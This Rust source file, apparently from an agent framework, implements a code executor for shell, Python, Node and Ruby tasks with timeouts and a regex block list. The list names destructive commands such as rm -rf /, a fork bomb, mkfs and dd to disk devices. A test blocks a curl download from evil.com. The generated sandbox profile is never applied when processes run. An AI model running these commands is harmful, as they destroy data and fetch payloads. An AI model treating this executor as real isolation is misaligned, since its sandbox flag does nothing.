//! Code execution executor
//!
//! Implements the TaskExecutor trait for code/script execution.
//! Supports Shell, Python, and Node.js runtimes with sandboxing.

use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use regex::Regex;
use serde::{Deserialize, Serialize};
use tokio::io::AsyncReadExt;
use tokio::process::Command;
use tracing::{debug, info, warn};

use super::{ExecutionContext, PathPermissionChecker, TaskExecutor};
use crate::cowork::types::{CodeExec, Language, Task, TaskResult, TaskType};
use crate::error::{AetherError, Result};

/// Maximum stdout size (10MB)
const MAX_STDOUT_SIZE: usize = 10 * 1024 * 1024;

/// Maximum stderr size (1MB)
const MAX_STDERR_SIZE: usize = 1024 * 1024;

/// Error types for code execution
#[derive(Debug, Clone, thiserror::Error)]
pub enum CodeExecError {
    #[error("Code execution is disabled")]
    Disabled,

    #[error("Runtime not found: {0}")]
    RuntimeNotFound(String),

    #[error("Runtime not allowed: {0}")]
    RuntimeNotAllowed(String),

    #[error("Execution timeout after {0} seconds")]
    Timeout(u64),

    #[error("Command blocked: {reason}")]
    Blocked { reason: String },

    #[error("Sandbox error: {0}")]
    SandboxError(String),

    #[error("Execution failed with exit code {code}: {message}")]
    ExecutionFailed { code: i32, message: String },

    #[error("IO error: {0}")]
    IoError(String),

    #[error("Path not allowed: {0}")]
    PathNotAllowed(PathBuf),
}

impl From<std::io::Error> for CodeExecError {
    fn from(err: std::io::Error) -> Self {
        CodeExecError::IoError(err.to_string())
    }
}

/// Result of code execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CodeExecResult {
    /// Exit code (0 = success)
    pub exit_code: i32,

    /// Captured stdout
    pub stdout: String,

    /// Captured stderr
    pub stderr: String,

    /// Execution duration in milliseconds
    pub duration_ms: u64,

    /// Whether stdout was truncated
    pub stdout_truncated: bool,

    /// Whether stderr was truncated
    pub stderr_truncated: bool,

    /// Runtime used
    pub runtime: String,
}

/// Information about an available runtime
#[derive(Debug, Clone)]
pub struct RuntimeInfo {
    /// Runtime name (e.g., "python", "node")
    pub name: String,

    /// Path to the runtime executable
    pub path: PathBuf,

    /// Runtime version (if detected)
    pub version: Option<String>,

    /// Whether the runtime is available
    pub available: bool,
}

impl RuntimeInfo {
    /// Detect a runtime by name
    pub async fn detect(runtime: &str) -> Self {
        let cmd = match std::env::consts::OS {
            "windows" => "where",
            _ => "which",
        };

        let output = Command::new(cmd).arg(runtime).output().await;

        match output {
            Ok(out) if out.status.success() => {
                let path_str = String::from_utf8_lossy(&out.stdout).trim().to_string();
                let path = PathBuf::from(&path_str);

                // Try to get version
                let version = Self::get_version(runtime, &path).await;

                Self {
                    name: runtime.to_string(),
                    path,
                    version,
                    available: true,
                }
            }
            _ => Self {
                name: runtime.to_string(),
                path: PathBuf::new(),
                version: None,
                available: false,
            },
        }
    }

    async fn get_version(runtime: &str, path: &Path) -> Option<String> {
        let version_flag = match runtime {
            "python" | "python3" => "--version",
            "node" => "--version",
            "bash" | "zsh" => "--version",
            _ => return None,
        };

        let output = Command::new(path).arg(version_flag).output().await.ok()?;

        if output.status.success() {
            let version = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if version.is_empty() {
                let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
                if !stderr.is_empty() {
                    return Some(stderr);
                }
            }
            Some(version)
        } else {
            None
        }
    }
}

/// Command checker for blocking dangerous commands
pub struct CommandChecker {
    /// Blocked command patterns
    patterns: Vec<Regex>,
}

impl Default for CommandChecker {
    fn default() -> Self {
        Self::new(vec![])
    }
}

impl CommandChecker {
    /// Default blocked patterns
    const DEFAULT_BLOCKED: &'static [&'static str] = &[
        r"rm\s+-rf\s+/\s*$",       // rm -rf /
        r"rm\s+-rf\s+/\*",         // rm -rf /*
        r"rm\s+-rf\s+~\s*$",       // rm -rf ~
        r"sudo\s+",                // any sudo command
        r"chmod\s+777\s+/",        // chmod 777 /
        r":\(\)\s*\{\s*:\|:&\s*\}\s*;:", // fork bomb
        r">\s*/dev/sd[a-z]",       // overwrite disk
        r"mkfs\.",                 // format filesystem
        r"dd\s+if=.*of=/dev/",     // dd to device
    ];

    /// Create a new command checker with additional blocked patterns
    pub fn new(additional_blocked: Vec<String>) -> Self {
        let mut patterns = Vec::new();

        // Add default patterns
        for pattern in Self::DEFAULT_BLOCKED {
            if let Ok(regex) = Regex::new(pattern) {
                patterns.push(regex);
            }
        }

        // Add user-defined patterns
        for pattern in additional_blocked {
            match Regex::new(&pattern) {
                Ok(regex) => patterns.push(regex),
                Err(e) => warn!("Invalid blocked pattern '{}': {}", pattern, e),
            }
        }

        Self { patterns }
    }

    /// Check if a command is dangerous
    pub fn is_blocked(&self, command: &str) -> Option<String> {
        for pattern in &self.patterns {
            if pattern.is_match(command) {
                return Some(format!("Matches blocked pattern: {}", pattern.as_str()));
            }
        }
        None
    }
}

/// Sandbox configuration for macOS
#[derive(Debug, Clone)]
pub struct SandboxConfig {
    /// Whether sandbox is enabled
    pub enabled: bool,

    /// Allowed read paths
    pub read_paths: Vec<PathBuf>,

    /// Allowed write paths
    pub write_paths: Vec<PathBuf>,

    /// Allow network access
    pub allow_network: bool,

    /// Allow process execution
    pub allow_exec: bool,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            read_paths: vec![],
            write_paths: vec![],
            allow_network: false,
            allow_exec: true,
        }
    }
}

impl SandboxConfig {
    /// Generate macOS sandbox-exec profile
    #[cfg(target_os = "macos")]
    pub fn generate_profile(&self) -> String {
        let mut profile = String::from("(version 1)\n(deny default)\n");

        // Allow basic process operations
        profile.push_str("(allow process-fork)\n");

        if self.allow_exec {
            profile.push_str("(allow process-exec)\n");
        }

        // Allow read paths
        for path in &self.read_paths {
            let path_str = path.to_string_lossy();
            profile.push_str(&format!("(allow file-read* (subpath \"{}\"))\n", path_str));
        }

        // Allow write paths
        for path in &self.write_paths {
            let path_str = path.to_string_lossy();
            profile.push_str(&format!("(allow file-write* (subpath \"{}\"))\n", path_str));
        }

        // Network access
        if self.allow_network {
            profile.push_str("(allow network*)\n");
        }

        // Allow reading system libraries and frameworks
        profile.push_str("(allow file-read* (subpath \"/usr\"))\n");
        profile.push_str("(allow file-read* (subpath \"/System\"))\n");
        profile.push_str("(allow file-read* (subpath \"/Library\"))\n");
        profile.push_str("(allow file-read* (subpath \"/private/var\"))\n");

        // Allow reading home directory basics
        if let Some(home) = dirs::home_dir() {
            let home_str = home.to_string_lossy();
            profile.push_str(&format!(
                "(allow file-read* (subpath \"{}/Library\"))\n",
                home_str
            ));
        }

        profile
    }

    #[cfg(not(target_os = "macos"))]
    pub fn generate_profile(&self) -> String {
        // Non-macOS platforms: return empty (sandbox not supported)
        String::new()
    }
}

/// Code execution executor
pub struct CodeExecutor {
    /// Whether code execution is enabled
    enabled: bool,

    /// Default runtime
    default_runtime: String,

    /// Execution timeout in seconds
    timeout_seconds: u64,

    /// Sandbox configuration
    sandbox_config: SandboxConfig,

    /// Allowed runtimes (empty = all)
    allowed_runtimes: Vec<String>,

    /// Command checker for blocking dangerous commands
    command_checker: CommandChecker,

    /// Permission checker for file paths
    permission_checker: PathPermissionChecker,

    /// Working directory
    working_directory: Option<PathBuf>,

    /// Environment variables to pass
    pass_env: Vec<String>,

    /// Runtime info cache to avoid repeated detection
    runtime_cache: std::sync::Arc<tokio::sync::RwLock<std::collections::HashMap<String, RuntimeInfo>>>,
}

impl CodeExecutor {
    /// Create a new code executor
    pub fn new(
        enabled: bool,
        default_runtime: String,
        timeout_seconds: u64,
        sandbox_enabled: bool,
        allowed_runtimes: Vec<String>,
        allow_network: bool,
        blocked_commands: Vec<String>,
        permission_checker: PathPermissionChecker,
        working_directory: Option<PathBuf>,
        pass_env: Vec<String>,
    ) -> Self {
        let sandbox_config = SandboxConfig {
            enabled: sandbox_enabled,
            allow_network,
            ..Default::default()
        };

        Self {
            enabled,
            default_runtime,
            timeout_seconds,
            sandbox_config,
            allowed_runtimes,
            command_checker: CommandChecker::new(blocked_commands),
            permission_checker,
            working_directory,
            pass_env,
            runtime_cache: std::sync::Arc::new(tokio::sync::RwLock::new(std::collections::HashMap::new())),
        }
    }

    /// Get cached runtime info, detecting if not cached
    async fn get_runtime_info(&self, runtime: &str) -> RuntimeInfo {
        // Check cache first
        {
            let cache = self.runtime_cache.read().await;
            if let Some(info) = cache.get(runtime) {
                return info.clone();
            }
        }

        // Not cached, detect and cache
        let info = RuntimeInfo::detect(runtime).await;

        // Store in cache
        {
            let mut cache = self.runtime_cache.write().await;
            cache.insert(runtime.to_string(), info.clone());
        }

        info
    }

    /// Get the runtime command for a language
    fn get_runtime_command(language: &Language) -> &'static str {
        match language {
            Language::Python => "python3",
            Language::JavaScript => "node",
            Language::Shell => "bash",
            Language::Ruby => "ruby",
            Language::Rust => "rustc",
        }
    }

    /// Check if a runtime is allowed
    fn is_runtime_allowed(&self, runtime: &str) -> bool {
        if self.allowed_runtimes.is_empty() {
            return true;
        }
        self.allowed_runtimes.iter().any(|r| r == runtime)
    }

    /// Execute a shell command
    async fn execute_command(
        &self,
        cmd: &str,
        args: &[String],
        ctx: &ExecutionContext,
    ) -> Result<CodeExecResult> {
        let full_command = if args.is_empty() {
            cmd.to_string()
        } else {
            format!("{} {}", cmd, args.join(" "))
        };

        // Check for blocked commands
        if let Some(reason) = self.command_checker.is_blocked(&full_command) {
            return Err(AetherError::other(CodeExecError::Blocked { reason }.to_string()));
        }

        // Check runtime availability (using cache)
        let runtime_info = self.get_runtime_info(cmd).await;
        if !runtime_info.available {
            return Err(AetherError::other(
                CodeExecError::RuntimeNotFound(cmd.to_string()).to_string(),
            ));
        }

        if ctx.dry_run {
            return Ok(CodeExecResult {
                exit_code: 0,
                stdout: format!("[DRY RUN] Would execute: {}", full_command),
                stderr: String::new(),
                duration_ms: 0,
                stdout_truncated: false,
                stderr_truncated: false,
                runtime: cmd.to_string(),
            });
        }

        self.run_process(cmd, args, None, ctx).await
    }

    /// Execute inline script
    async fn execute_script(
        &self,
        code: &str,
        language: &Language,
        ctx: &ExecutionContext,
    ) -> Result<CodeExecResult> {
        let runtime = Self::get_runtime_command(language);

        // Check if runtime is allowed
        if !self.is_runtime_allowed(runtime) {
            return Err(AetherError::other(
                CodeExecError::RuntimeNotAllowed(runtime.to_string()).to_string(),
            ));
        }

        // Check for blocked commands in the script
        if let Some(reason) = self.command_checker.is_blocked(code) {
            return Err(AetherError::other(CodeExecError::Blocked { reason }.to_string()));
        }

        // Check runtime availability (using cache)
        let runtime_info = self.get_runtime_info(runtime).await;
        if !runtime_info.available {
            return Err(AetherError::other(
                CodeExecError::RuntimeNotFound(runtime.to_string()).to_string(),
            ));
        }

        if ctx.dry_run {
            return Ok(CodeExecResult {
                exit_code: 0,
                stdout: format!("[DRY RUN] Would execute {} script:\n{}", runtime, code),
                stderr: String::new(),
                duration_ms: 0,
                stdout_truncated: false,
                stderr_truncated: false,
                runtime: runtime.to_string(),
            });
        }

        // Execute based on language
        let args = match language {
            Language::Python => vec!["-c".to_string(), code.to_string()],
            Language::JavaScript => vec!["-e".to_string(), code.to_string()],
            Language::Shell => vec!["-c".to_string(), code.to_string()],
            Language::Ruby => vec!["-e".to_string(), code.to_string()],
            Language::Rust => {
                // Rust needs compilation, not supported for inline execution
                return Err(AetherError::other(
                    "Inline Rust execution not supported. Use a script file instead.".to_string(),
                ));
            }
        };

        self.run_process(runtime, &args, None, ctx).await
    }

    /// Execute a script file
    async fn execute_file(&self, path: &Path, ctx: &ExecutionContext) -> Result<CodeExecResult> {
        // Check file path permission
        let canonical_path = self
            .permission_checker
            .check_path(path)
            .map_err(|e| AetherError::other(CodeExecError::PathNotAllowed(path.to_path_buf()).to_string()))?;

        // Detect language from extension
        let extension = path.extension().and_then(|e| e.to_str()).unwrap_or("");
        let (runtime, args) = match extension {
            "py" => ("python3", vec![canonical_path.to_string_lossy().to_string()]),
            "js" => ("node", vec![canonical_path.to_string_lossy().to_string()]),
            "sh" | "bash" => ("bash", vec![canonical_path.to_string_lossy().to_string()]),
            "rb" => ("ruby", vec![canonical_path.to_string_lossy().to_string()]),
            _ => {
                // Default to shell
                ("bash", vec![canonical_path.to_string_lossy().to_string()])
            }
        };

        // Check if runtime is allowed
        if !self.is_runtime_allowed(runtime) {
            return Err(AetherError::other(
                CodeExecError::RuntimeNotAllowed(runtime.to_string()).to_string(),
            ));
        }

        // Check runtime availability (using cache)
        let runtime_info = self.get_runtime_info(runtime).await;
        if !runtime_info.available {
            return Err(AetherError::other(
                CodeExecError::RuntimeNotFound(runtime.to_string()).to_string(),
            ));
        }

        if ctx.dry_run {
            return Ok(CodeExecResult {
                exit_code: 0,
                stdout: format!("[DRY RUN] Would execute file: {:?}", canonical_path),
                stderr: String::new(),
                duration_ms: 0,
                stdout_truncated: false,
                stderr_truncated: false,
                runtime: runtime.to_string(),
            });
        }

        self.run_process(runtime, &args, Some(&canonical_path), ctx)
            .await
    }

    /// Run a process with timeout and output capture
    async fn run_process(
        &self,
        runtime: &str,
        args: &[String],
        script_path: Option<&Path>,
        ctx: &ExecutionContext,
    ) -> Result<CodeExecResult> {
        let start = Instant::now();

        // Build command
        let mut cmd = Command::new(runtime);
        cmd.args(args);

        // Set working directory
        if let Some(ref working_dir) = self.working_directory {
            cmd.current_dir(working_dir);
        } else if let Some(ref ctx_working_dir) = ctx.working_dir {
            cmd.current_dir(ctx_working_dir);
        }

        // Set environment variables
        cmd.env_clear();
        for var in &self.pass_env {
            if let Ok(value) = std::env::var(var) {
                cmd.env(var, value);
            }
        }

        // Setup pipes
        cmd.stdout(Stdio::piped());
        cmd.stderr(Stdio::piped());
        cmd.stdin(Stdio::null());

        // Spawn process
        let mut child = cmd.spawn().map_err(|e| {
            AetherError::other(CodeExecError::IoError(format!("Failed to spawn process: {}", e)).to_string())
        })?;

        // Capture output with timeout
        let timeout = Duration::from_secs(self.timeout_seconds);
        let result = tokio::time::timeout(timeout, async {
            let mut stdout_buf = Vec::new();
            let mut stderr_buf = Vec::new();
            let mut stdout_truncated = false;
            let mut stderr_truncated = false;

            // Read stdout
            if let Some(mut stdout) = child.stdout.take() {
                let mut buf = vec![0u8; 8192];
                loop {
                    match stdout.read(&mut buf).await {
                        Ok(0) => break,
                        Ok(n) => {
                            if stdout_buf.len() + n > MAX_STDOUT_SIZE {
                                let remaining = MAX_STDOUT_SIZE - stdout_buf.len();
                                stdout_buf.extend_from_slice(&buf[..remaining]);
                                stdout_truncated = true;
                                break;
                            }
                            stdout_buf.extend_from_slice(&buf[..n]);
                        }
                        Err(_) => break,
                    }
                }
            }

            // Read stderr
            if let Some(mut stderr) = child.stderr.take() {
                let mut buf = vec![0u8; 8192];
                loop {
                    match stderr.read(&mut buf).await {
                        Ok(0) => break,
                        Ok(n) => {
                            if stderr_buf.len() + n > MAX_STDERR_SIZE {
                                let remaining = MAX_STDERR_SIZE - stderr_buf.len();
                                stderr_buf.extend_from_slice(&buf[..remaining]);
                                stderr_truncated = true;
                                break;
                            }
                            stderr_buf.extend_from_slice(&buf[..n]);
                        }
                        Err(_) => break,
                    }
                }
            }

            // Wait for process to exit
            let status = child.wait().await?;

            Ok::<_, std::io::Error>((
                status,
                stdout_buf,
                stderr_buf,
                stdout_truncated,
                stderr_truncated,
            ))
        })
        .await;

        let duration_ms = start.elapsed().as_millis() as u64;

        match result {
            Ok(Ok((status, stdout_buf, stderr_buf, stdout_truncated, stderr_truncated))) => {
                let stdout = String::from_utf8_lossy(&stdout_buf).to_string();
                let stderr = String::from_utf8_lossy(&stderr_buf).to_string();

                let exit_code = status.code().unwrap_or(-1);

                Ok(CodeExecResult {
                    exit_code,
                    stdout,
                    stderr,
                    duration_ms,
                    stdout_truncated,
                    stderr_truncated,
                    runtime: runtime.to_string(),
                })
            }
            Ok(Err(e)) => Err(AetherError::other(
                CodeExecError::IoError(e.to_string()).to_string(),
            )),
            Err(_) => {
                // Timeout - kill process
                let _ = child.kill().await;
                Err(AetherError::other(
                    CodeExecError::Timeout(self.timeout_seconds).to_string(),
                ))
            }
        }
    }
}

#[async_trait]
impl TaskExecutor for CodeExecutor {
    fn supported_types(&self) -> Vec<&'static str> {
        vec!["code_execution"]
    }

    fn can_execute(&self, task_type: &TaskType) -> bool {
        matches!(task_type, TaskType::CodeExecution(_))
    }

    async fn execute(&self, task: &Task, ctx: &ExecutionContext) -> Result<TaskResult> {
        if !self.enabled {
            return Err(AetherError::other(CodeExecError::Disabled.to_string()));
        }

        let code_exec = match &task.task_type {
            TaskType::CodeExecution(ce) => ce,
            _ => {
                return Err(AetherError::other(
                    "Task is not a code execution task".to_string(),
                ))
            }
        };

        info!("Executing code task: {}", task.name);

        let result = match code_exec {
            CodeExec::Script { code, language } => {
                debug!("Executing {} script", Self::get_runtime_command(language));
                self.execute_script(code, language, ctx).await?
            }
            CodeExec::File { path } => {
                debug!("Executing script file: {:?}", path);
                self.execute_file(path, ctx).await?
            }
            CodeExec::Command { cmd, args } => {
                debug!("Executing command: {} {:?}", cmd, args);
                self.execute_command(cmd, args, ctx).await?
            }
        };

        // Create TaskResult
        let output = serde_json::to_value(&result).unwrap_or_default();

        // Create summary message
        let summary = if result.exit_code == 0 {
            Some(format!(
                "Executed {} successfully in {}ms",
                result.runtime, result.duration_ms
            ))
        } else {
            Some(format!(
                "Execution failed with exit code {} in {}ms",
                result.exit_code, result.duration_ms
            ))
        };

        Ok(TaskResult {
            output,
            artifacts: vec![],
            duration: Duration::from_millis(result.duration_ms),
            summary,
        })
    }

    fn name(&self) -> &str {
        "CodeExecutor"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_command_checker_default_blocked() {
        let checker = CommandChecker::default();

        // Should block dangerous commands
        assert!(checker.is_blocked("rm -rf /").is_some());
        assert!(checker.is_blocked("sudo apt install").is_some());
        assert!(checker.is_blocked("chmod 777 /etc").is_some());

        // Should allow safe commands
        assert!(checker.is_blocked("ls -la").is_none());
        assert!(checker.is_blocked("echo hello").is_none());
        assert!(checker.is_blocked("python3 script.py").is_none());
    }

    #[test]
    fn test_command_checker_custom_blocked() {
        let checker = CommandChecker::new(vec!["curl.*evil\\.com".to_string()]);

        assert!(checker.is_blocked("curl https://evil.com/malware").is_some());
        assert!(checker.is_blocked("curl https://example.com").is_none());
    }

    #[tokio::test]
    async fn test_runtime_detection() {
        // bash should be available on most systems
        let bash = RuntimeInfo::detect("bash").await;
        // This test may fail on Windows, but that's expected
        #[cfg(unix)]
        assert!(bash.available);
    }

    #[test]
    fn test_code_exec_result_serialization() {
        let result = CodeExecResult {
            exit_code: 0,
            stdout: "hello world".to_string(),
            stderr: String::new(),
            duration_ms: 100,
            stdout_truncated: false,
            stderr_truncated: false,
            runtime: "bash".to_string(),
        };

        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("hello world"));
        assert!(json.contains("exit_code"));
    }

    #[test]
    fn test_is_runtime_allowed() {
        let permission_checker = PathPermissionChecker::default();

        // All runtimes allowed when list is empty
        let executor = CodeExecutor::new(
            true,
            "bash".to_string(),
            60,
            true,
            vec![],
            false,
            vec![],
            permission_checker.clone(),
            None,
            vec!["PATH".to_string()],
        );
        assert!(executor.is_runtime_allowed("python3"));
        assert!(executor.is_runtime_allowed("node"));

        // Only specific runtimes allowed
        let executor2 = CodeExecutor::new(
            true,
            "bash".to_string(),
            60,
            true,
            vec!["bash".to_string(), "python3".to_string()],
            false,
            vec![],
            permission_checker,
            None,
            vec!["PATH".to_string()],
        );
        assert!(executor2.is_runtime_allowed("bash"));
        assert!(executor2.is_runtime_allowed("python3"));
        assert!(!executor2.is_runtime_allowed("node"));
    }

    #[tokio::test]
    async fn test_dry_run_execution() {
        let permission_checker = PathPermissionChecker::default();
        let executor = CodeExecutor::new(
            true,
            "bash".to_string(),
            60,
            false,
            vec![],
            false,
            vec![],
            permission_checker,
            None,
            vec!["PATH".to_string()],
        );

        let task = Task::new(
            "test_task",
            "Test Task",
            TaskType::CodeExecution(CodeExec::Command {
                cmd: "echo".to_string(),
                args: vec!["hello".to_string()],
            }),
        );

        let ctx = ExecutionContext::new("test_graph").with_dry_run(true);

        let result = executor.execute(&task, &ctx).await.unwrap();
        assert!(result.output["stdout"].as_str().unwrap().contains("DRY RUN"));
    }

    #[tokio::test]
    async fn test_disabled_execution() {
        let permission_checker = PathPermissionChecker::default();
        let executor = CodeExecutor::new(
            false, // disabled
            "bash".to_string(),
            60,
            false,
            vec![],
            false,
            vec![],
            permission_checker,
            None,
            vec!["PATH".to_string()],
        );

        let task = Task::new(
            "test_task",
            "Test Task",
            TaskType::CodeExecution(CodeExec::Command {
                cmd: "echo".to_string(),
                args: vec!["hello".to_string()],
            }),
        );

        let ctx = ExecutionContext::new("test_graph");

        let result = executor.execute(&task, &ctx).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("disabled"));
    }

    // ===== Sandbox Tests =====

    #[test]
    fn test_sandbox_config_default() {
        let config = SandboxConfig::default();
        // Default: sandbox enabled, allow_exec true (for running code)
        assert!(config.enabled);
        assert!(!config.allow_network);
        assert!(config.allow_exec);
        assert!(config.read_paths.is_empty());
        assert!(config.write_paths.is_empty());
    }

    #[test]
    #[cfg(target_os = "macos")]
    fn test_sandbox_profile_generation_basic() {
        let config = SandboxConfig {
            enabled: true,
            read_paths: vec![],
            write_paths: vec![],
            allow_network: false,
            allow_exec: false,
        };

        let profile = config.generate_profile();

        // Should contain version declaration
        assert!(profile.contains("(version 1)"));

        // Should have deny default which blocks everything not explicitly allowed
        assert!(profile.contains("(deny default)"));

        // Should NOT allow network when disabled
        assert!(!profile.contains("(allow network*)"));

        // Should NOT allow process-exec when disabled
        assert!(!profile.contains("(allow process-exec)"));
    }

    #[test]
    #[cfg(target_os = "macos")]
    fn test_sandbox_profile_with_network() {
        let config = SandboxConfig {
            enabled: true,
            read_paths: vec![],
            write_paths: vec![],
            allow_network: true,
            allow_exec: false,
        };

        let profile = config.generate_profile();

        // Should allow network when enabled
        assert!(profile.contains("(allow network*)"));
    }

    #[test]
    #[cfg(target_os = "macos")]
    fn test_sandbox_profile_with_exec() {
        let config = SandboxConfig {
            enabled: true,
            read_paths: vec![],
            write_paths: vec![],
            allow_network: false,
            allow_exec: true,
        };

        let profile = config.generate_profile();

        // Should allow process-exec when enabled
        assert!(profile.contains("(allow process-exec)"));
    }

    #[test]
    #[cfg(target_os = "macos")]
    fn test_sandbox_profile_with_paths() {
        let config = SandboxConfig {
            enabled: true,
            read_paths: vec![PathBuf::from("/tmp/test_read")],
            write_paths: vec![PathBuf::from("/tmp/test_write")],
            allow_network: false,
            allow_exec: false,
        };

        let profile = config.generate_profile();

        // Should include read path
        assert!(profile.contains("/tmp/test_read"));

        // Should include write path
        assert!(profile.contains("/tmp/test_write"));
    }

    #[test]
    fn test_sandbox_config_with_executor() {
        let permission_checker = PathPermissionChecker::default();

        // Create executor with sandbox enabled
        let executor = CodeExecutor::new(
            true,
            "bash".to_string(),
            60,
            true, // sandbox_enabled
            vec![],
            false, // allow_network
            vec![],
            permission_checker,
            None,
            vec!["PATH".to_string()],
        );

        // Verify sandbox config is set correctly
        assert!(executor.sandbox_config.enabled);
        assert!(!executor.sandbox_config.allow_network);
    }
}
